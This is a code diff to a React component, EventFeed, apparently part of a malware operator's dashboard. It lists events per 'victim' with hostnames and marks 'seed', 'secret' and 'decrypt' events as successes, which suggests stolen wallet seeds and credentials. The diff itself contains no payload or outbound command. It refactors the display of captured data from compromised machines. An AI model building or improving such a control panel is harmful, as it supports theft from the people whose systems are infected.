@@ -6,8 +6,9 @@ import type { EventRow } from '@/lib/types';
 import { ago } from '@/lib/format';
 import { Badge } from '@/components/ui/badge';
 import { Empty, SkeletonRows } from '@/components/ui/table';
+import { EventContent } from '@/components/event-content';
 
-const tone = (kind: string) => (kind.includes('seed') || kind.includes('decrypt') ? 'ok' : kind.includes('fail') ? 'bad' : kind.includes('enroll') ? 'brand' : 'default');
+const tone = (kind: string) => (kind.includes('seed') || kind.includes('secret') || kind.includes('decrypt') ? 'ok' : kind.includes('fail') ? 'bad' : kind.includes('enroll') ? 'brand' : 'default');
 
 export function EventFeed({ kind, victim, limit = 40 }: { kind?: string; victim?: string; limit?: number }) {
   const query = new URLSearchParams();
@@ -25,14 +26,10 @@ export function EventFeed({ kind, victim, limit = 40 }: { kind?: string; victim?
       {items.map((item) => (
         <li key={item.id} className="flex items-start gap-3 px-3 py-2">
           <Badge tone={tone(item.kind)}>{item.kind}</Badge>
-          <div className="min-w-0 flex-1">
-            <p className="truncate font-mono text-2xs text-muted">
-              {item.data.path ? String(item.data.path) : item.data.target ? String(item.data.target) : JSON.stringify(item.data).slice(0, 140)}
-            </p>
-            <p className="text-2xs text-muted/70">
-              {item.victim ? <Link href={`/victims/${item.victim.id}`} className="text-brand">{item.victim.id}</Link> : 'system'} · {ago(item.createdAt)} ago
-            </p>
-          </div>
+          <EventContent kind={item.kind} data={item.data} legacy={item.legacy} />
+          <p className="shrink-0 text-2xs text-muted/70">
+            {item.victim ? <Link href={`/victims/${item.victim.id}`} className="text-brand">{item.victim.hostname}</Link> : 'system'} · {ago(item.createdAt)} ago
+          </p>
           <button onClick={refresh} className="text-2xs text-muted/50 hover:text-ink">↻</button>
         </li>
       ))}
